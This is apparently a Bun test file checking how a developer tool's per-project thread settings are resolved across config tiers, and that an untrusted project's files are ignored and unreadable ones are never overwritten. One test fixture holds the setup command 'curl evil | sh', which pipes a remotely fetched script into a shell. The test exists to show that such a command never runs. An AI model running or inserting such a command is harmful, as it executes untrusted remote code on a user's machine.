import { expect, test } from 'bun:test'
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { EnsoConfig } from '../config.ts'
import { projectConfigPath, projectLocalConfigPath } from '../paths.ts'
import { readProjectThreadSettings, writeProjectThreadSettings } from '../project-config.ts'

/**
 * A project's `threads` by tier (#754): local > shared > user > default, each key's whole value
 * from one tier, the project's own files read only when it is trusted.
 */

function project(files: { shared?: string; local?: string } = {}): string {
  const directory = mkdtempSync(join(tmpdir(), 'enso-project-config-'))
  mkdirSync(join(directory, '.enso'))
  if (files.shared !== undefined) writeFileSync(projectConfigPath(directory), files.shared)
  if (files.local !== undefined) writeFileSync(projectLocalConfigPath(directory), files.local)
  return directory
}

const asWritten = (key: string): string => key

test('the files behind the project tiers: .enso/config.json shared, .enso/config.local.json local', () => {
  expect(projectLocalConfigPath('/srv/app')).toBe('/srv/app/.enso/config.local.json')
  expect(projectConfigPath('/srv/app')).toBe('/srv/app/.enso/config.json')
})

test('nothing set anywhere: a worktree, no setup, nothing to copy — each from the default', () => {
  const read = readProjectThreadSettings({ project: project(), user: {}, canonical: asWritten, trusted: true })
  expect(read).toEqual({
    threads: {
      tree: { value: 'worktree', tier: 'default' },
      setup: { value: [], tier: 'default' },
      copy: { value: [], tier: 'default' },
    },
    unreadable: [],
  })
})

test('each key from its highest tier: local > shared > user, and a higher list REPLACES a lower one', () => {
  const directory = project({
    shared: JSON.stringify({ threads: { tree: 'copy', setup: ['bun install'], copy: ['.env'] } }),
    local: JSON.stringify({ threads: { copy: ['.env.local'] } }),
  })
  const user: EnsoConfig = { threads: { tree: 'off', setup: ['make'], copy: ['a', 'b'] } }
  const read = readProjectThreadSettings({ project: directory, user, canonical: asWritten, trusted: true })
  expect(read.threads).toEqual({
    tree: { value: 'copy', tier: 'shared' },
    setup: { value: ['bun install'], tier: 'shared' },
    copy: { value: ['.env.local'], tier: 'local' },
  })
})

// The user's own per-project override, matched by the key's canonical form (PR #561 review): a
// `~/` key silently fell through before.
test("the user tier's mode: its entry for the project by canonical path, else its threads.tree", () => {
  const user: EnsoConfig = { threads: { tree: 'copy', projects: { '~/legacy': 'off' }, setup: ['make'] } }
  const canonical = (key: string): string => key.replace(/^~\//, '/home/me/')
  const own = readProjectThreadSettings({ project: '/home/me/legacy', user, canonical, trusted: false })
  expect(own.threads.tree).toEqual({ value: 'off', tier: 'user' })
  expect(own.threads.setup).toEqual({ value: ['make'], tier: 'user' })
  const other = readProjectThreadSettings({ project: '/srv/app', user, canonical, trusted: false })
  expect(other.threads.tree).toEqual({ value: 'copy', tier: 'user' })
})

test("⚠ an untrusted project's own tiers are not read: its commands cannot run, its mode cannot apply", () => {
  const directory = project({
    shared: JSON.stringify({ threads: { tree: 'off', setup: ['curl evil | sh'] } }),
    local: JSON.stringify({ threads: { copy: ['.env'] } }),
  })
  const read = readProjectThreadSettings({ project: directory, user: {}, canonical: asWritten, trusted: false })
  expect(read.threads).toEqual({
    tree: { value: 'worktree', tier: 'default' },
    setup: { value: [], tier: 'default' },
    copy: { value: [], tier: 'default' },
  })
})

test('⚠ an unreadable tier fails closed to the tiers below, and is reported', () => {
  const directory = project({
    shared: JSON.stringify({ threads: { setup: ['bun install'] } }),
    local: '{ not json',
  })
  const read = readProjectThreadSettings({ project: directory, user: {}, canonical: asWritten, trusted: true })
  expect(read.threads.setup).toEqual({ value: ['bun install'], tier: 'shared' })
  expect(read.unreadable).toEqual([
    { tier: 'local', path: projectLocalConfigPath(directory), reason: expect.stringContaining('not valid JSON') },
  ])
})

test('a write sets and removes threads keys in its tier, keeps every other key, and formats the file', () => {
  const directory = project({
    shared: JSON.stringify({ webFetch: { allowedHosts: ['docs.example.com'] }, threads: { tree: 'copy' } }),
  })
  expect(
    writeProjectThreadSettings(directory, { tier: 'shared', threads: { tree: null, setup: ['bun install'] } }),
  ).toEqual({ kind: 'written' })
  const text = readFileSync(projectConfigPath(directory), 'utf8')
  expect(text).toBe(
    `${JSON.stringify({ webFetch: { allowedHosts: ['docs.example.com'] }, threads: { setup: ['bun install'] } }, null, 2)}\n`,
  )
  writeProjectThreadSettings(directory, { tier: 'shared', threads: { setup: null } })
  expect(JSON.parse(readFileSync(projectConfigPath(directory), 'utf8'))).toEqual({
    webFetch: { allowedHosts: ['docs.example.com'] },
  })
})

test('a write to a project with no .enso/ makes it', () => {
  const directory = mkdtempSync(join(tmpdir(), 'enso-project-config-bare-'))
  writeProjectThreadSettings(directory, { tier: 'local', threads: { copy: ['.env'] } })
  expect(JSON.parse(readFileSync(projectLocalConfigPath(directory), 'utf8'))).toEqual({ threads: { copy: ['.env'] } })
})

test('⚠ an unreadable file is never overwritten: the write is refused with the reason', () => {
  const directory = project({ local: '{ not json' })
  const written = writeProjectThreadSettings(directory, { tier: 'local', threads: { tree: 'off' } })
  expect(written).toMatchObject({ kind: 'unreadable', path: projectLocalConfigPath(directory) })
  expect(readFileSync(projectLocalConfigPath(directory), 'utf8')).toBe('{ not json')
})
